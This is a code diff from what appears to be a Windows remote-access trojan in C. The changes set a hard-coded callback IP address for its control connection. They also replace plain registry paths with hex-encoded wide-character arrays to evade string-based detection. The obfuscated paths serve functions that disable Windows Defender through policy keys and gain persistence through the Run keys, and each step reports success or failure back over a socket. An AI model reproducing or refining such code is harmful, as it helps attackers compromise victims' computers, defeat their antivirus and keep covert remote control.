@@ -19,7 +19,7 @@
 #ifdef LOCALTEST
 #define ADDRESS "192.168.1.96"
 #else
-#define ADDRESS "PUBLIC IP LOL"
+#define ADDRESS "75.162.112.39"
 #endif
 
 #define MESSAGESIZE 10000
@@ -313,8 +313,11 @@ void attemptDefeatDefender(SOCKET* pSockfd) {
 	char failed[] = "Failed to create new value.\n";
 	char success[] = "Succeeded in creating registry value!\n";
 
+	// This is the path in hex stored on the stack.
+	wchar_t path[] = { 0x0053, 0x004f, 0x0046, 0x0054, 0x0057, 0x0041, 0x0052, 0x0045, 0x005c, 0x0050, 0x006f, 0x006c, 0x0069, 0x0063, 0x0069, 0x0065, 0x0073, 0x005c, 0x004d, 0x0069, 0x0063, 0x0072, 0x006f, 0x0073, 0x006f, 0x0066, 0x0074, 0x005c, 0x0057, 0x0069, 0x006e, 0x0064, 0x006f, 0x0077, 0x0073, 0x0020, 0x0044, 0x0065, 0x0066, 0x0065, 0x006e, 0x0064, 0x0065, 0x0072, 0x0000 };
+	
 	// Need to get a handle to the registry tree.
-	if (pRegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_WRITE, &key) != ERROR_SUCCESS) {
+	if (pRegOpenKeyExW(HKEY_LOCAL_MACHINE, path, 0, KEY_WRITE, &key) != ERROR_SUCCESS) {
 		pSend(*pSockfd, failed, sizeof failed, 0);
 		return;
 	}
@@ -353,8 +356,10 @@ void attemptRegistryPersistence(SOCKET* pSockfd) {
 	GetModuleFileNameW(NULL, dirName, 100);
 
 	//printf(dirName); <--- so that I remember the pain, THIS PRINTS CHARS!!! THATS WHY IT WORKED!!! THEY'RE NOT WIDE!!!
+
+	wchar_t path[] = { 0x0053, 0x004f, 0x0046, 0x0054, 0x0057, 0x0041, 0x0052, 0x0045, 0x005c, 0x004d, 0x0069, 0x0063, 0x0072, 0x006f, 0x0073, 0x006f, 0x0066, 0x0074, 0x005c, 0x0057, 0x0069, 0x006e, 0x0064, 0x006f, 0x0077, 0x0073, 0x005c, 0x0043, 0x0075, 0x0072, 0x0072, 0x0065, 0x006e, 0x0074, 0x0056, 0x0065, 0x0072, 0x0073, 0x0069, 0x006f, 0x006e, 0x005c, 0x0052, 0x0075, 0x006e, 0x0000 };
 	
-	if ((rv = pRegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &key)) != ERROR_SUCCESS) {
+	if ((rv = pRegOpenKeyExW(HKEY_LOCAL_MACHINE, path, 0, KEY_WRITE, &key)) != ERROR_SUCCESS) {
 		pSend(*pSockfd, failedSys, sizeof failedSys, 0);
 	}
 
@@ -375,7 +380,7 @@ void attemptRegistryPersistence(SOCKET* pSockfd) {
 
 	// HERE IS WHERE I ATTEMPTED 2 HOURS OF POINTLESS FIXES.
 
-	if ((rv = pRegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &key)) != ERROR_SUCCESS) {
+	if ((rv = pRegOpenKeyExW(HKEY_CURRENT_USER, path, 0, KEY_WRITE, &key)) != ERROR_SUCCESS) {
 		pSend(*pSockfd, failedUser, sizeof failedUser, 0);
 	}
 
